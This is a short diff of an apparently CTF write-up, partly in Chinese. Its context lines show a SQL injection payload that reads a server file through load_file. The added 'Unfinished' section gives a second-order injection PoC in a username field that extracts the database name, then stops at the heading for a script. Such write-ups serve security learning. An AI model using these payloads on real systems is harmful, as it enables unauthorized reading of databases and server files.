@@ -348,3 +348,14 @@ cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm
 ```
 title=123&category=',content=(select hex(load_file('/tmp/html/flag_8946e1ff1ee3e40f.php'))),/*&content=1
 ```
+
+## Unfinished
+
+用户名存在二次注入
+
+Poc:
+```
+username=0'+(select hex(hex(database())))+'0
+```
+
+脚本
